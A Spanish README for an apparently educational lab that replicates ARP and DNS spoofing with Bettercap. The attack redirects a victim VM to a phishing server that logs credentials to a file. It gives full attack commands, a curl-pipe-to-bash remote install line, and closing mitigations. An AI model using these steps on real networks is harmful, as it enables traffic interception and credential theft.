# DNS Spoofing Attack in a Controlled Environment

Este repositorio contiene el material y la documentación necesaria para replicar un ataque de **DNS Spoofing** en un entorno de laboratorio controlado. El proyecto demuestra cómo un atacante en la misma red local puede interceptar y manipular el tráfico DNS mediante **ARP Spoofing**, redirigiendo a la víctima a un servidor malicioso.

## 📋 Tabla de Contenidos
- [Escenario del Laboratorio](#escenario-del-laboratorio)
- [Requisitos Previos](#requisitos-previos)
- [Instalación y Configuración](#instalación-y-configuración)
- [Ejecución del Ataque (Paso a Paso)](#ejecución-del-ataque-paso-a-paso)
  - [1. Configuración del Servidor Phishing](#1-configuración-del-servidor-phishing)
  - [2. Ejecución de Bettercap](#2-ejecución-de-bettercap)
- [Verificación y Evidencia](#verificación-y-evidencia)
- [Mitigación y Defensa](#mitigación-y-defensa)
- [Referencias](#referencias)

---

## 🏰 Escenario del Laboratorio

El laboratorio simula un segmento de red LAN utilizando virtualización.

| Rol | S.O. | Herramienta Clave | IP (Ejemplo) | MAC (Ejemplo) |
| :--- | :--- | :--- | :--- | :--- |
| **Atacante** | Kali Linux | Bettercap, Flask | `192.168.0.116` | `7f:c8...` |
| **Víctima** | Windows 10 | Navegador Web | `192.168.0.117` | `78:66...` |
| **Gateway** | (Virtual) | - | `192.168.0.0` | `50:98...` |

**Topología**: Ambas máquinas deben estar configuradas en modo **Puente (Bridged)** en VMware para estar en el mismo segmento de red física o virtual.

---

## 🛠 Requisitos Previos

1. **VMware Workstation o Player**.
2. **Máquina Virtual Kali Linux** (Atacante) con acceso a internet.
3. **Máquina Virtual Windows 10** (Víctima).
4. **Python 3** instalado en Kali Linux.
5. **Bettercap** instalado en Kali Linux.

---

## ⚙️ Instalación y Configuración

### En la Máquina Atacante (Kali Linux)

1. **Clonar el repositorio**:
   ```bash
   git clone https://github.com/BrDenky/DNSAttack.git
   cd DNSAttack
   ```

2. **Instalar dependencias de Python (Flask)**:
   ```bash
   pip install flask
   ```
   *O si prefieres usar el script de instalación automática mencionado en el informe:*
   ```bash
   curl -sSL https://gist.github.com/BrDenky/bcc41c9546a22c59d7eb4d2c4e208825/raw/install.sh | bash
   ```

3. **Instalar Bettercap**:
   ```bash
   sudo apt update
   sudo apt install bettercap
   ```

---

## 🚀 Ejecución del Ataque (Paso a Paso)

### 1. Configuración del Servidor Phishing

El servidor web falso capturará las credenciales de la víctima. Este servidor sirve el archivo `index.html` y escucha en el puerto 80.

1. Asegúrate de que el puerto 80 esté libre.
2. Ejecuta el servidor con permisos de superusuario (necesario para el puerto 80):
   ```bash
   sudo python3 server.py
   ```
   *El servidor quedará esperando conexiones. Las credenciales capturadas se guardarán en `creds.txt`.*

### 2. Ejecución de Bettercap

En una **nueva terminal** en Kali Linux, iniciaremos el ataque de Man-in-the-Middle (ARP Spoofing) y DNS Spoofing.

1. **Iniciar Bettercap** seleccionando la interfaz de red (ej. `eth0`):
   ```bash
   sudo bettercap -iface eth0
   ```

2. **Configurar el objetivo (Víctima)**:
   Dentro de la consola interactiva de bettercap:
   ```bash
   # Escanear la red para encontrar a la víctima
   net.probe on
   
   # Listar dispositivos encontrados
   net.show
   
   # Establecer la IP de la víctima como objetivo (Reemplazar con la IP real)
   set arp.spoof.targets 192.168.0.117
   ```

3. **Iniciar ARP Spoofing**:
   ```bash
   arp.spoof on
   ```
   *En este punto, el tráfico de la víctima pasa por tu máquina.*

4. **Configurar DNS Spoofing**:
   Redirigiremos un dominio legítimo (ej. `example.com` o `fakebank.test`) a nuestra IP (Atacante).
   ```bash
   # Dominio que queremos suplantar
   set dns.spoof.domains example.com
   
   # IP del servidor malicioso (Tu IP de Kali)
   set dns.spoof.address 192.168.0.116
   
   # Iniciar el módulo de DNS Spoofing
   dns.spoof on
   ```

---

## 🕵️ Verificación y Evidencia

Para confirmar que el ataque es exitoso, realiza las siguientes pruebas en la **Máquina Víctima (Windows 10)**:

1. **Verificar Tabla ARP (Confirmar Envenenamiento)**:
   ```cmd
   arp -a
   ```
   *Busca la IP del Gateway. La dirección física (MAC) debería ser ahora la misma que la de la máquina atacante (Kali), indicando que el ARP Spoofing funciona.*

2. **Limpiar Caché DNS**:
   ```cmd
   ipconfig /flushdns
   ```

3. **Prueba de Resolución DNS**:
   ```cmd
   nslookup example.com
   ```
   *La respuesta debería ser la IP del atacante (`192.168.0.116`) en lugar de la IP real del dominio.*

4. **Prueba de Navegación**:
   Abre el navegador y entra a `http://example.com`. Deberías ver la página falsa servida por `server.py`.

5. **Captura de Credenciales**:
   Si la víctima introduce datos en el formulario falso, revisa el archivo `creds.txt` en la máquina atacante:
   ```bash
   cat creds.txt
   ```

---

## 🛡 Mitigación y Defensa

El informe detalla estrategias para defenderse de este ataque:

### 1. Mapeo Estático de ARP (Defensa Capa 2)
Evita que la tabla ARP sea modificada dinámicamente por atacantes.

**En Windows (Admin):**
```cmd
netsh interface ipv4 add neighbors "NombreInterfaz" <IP_Gateway> <MAC_Real_Gateway>
```
*Ejemplo:*
```cmd
netsh interface ipv4 add neighbors "Ethernet0" 192.168.0.1 00-50-56-f6-56-f6
```

### 2. Restricción de Tráfico DNS (Defensa Capa 3)
Configurar el Firewall para aceptar respuestas DNS (UDP/53) **solo** del Gateway legítimo.

### 3. Uso de DNS Encriptado (DoH / DoT)
Utilizar protocolos que encriptan y autentican las consultas DNS, evitando la manipulación en tránsito.

---

## 📄 Referencias
Basado en el paper:
**"DNS Spoofing Attack in a Controlled Environment"** - Mateo David Pilaquinga Guachamin, Yachay Tech University.
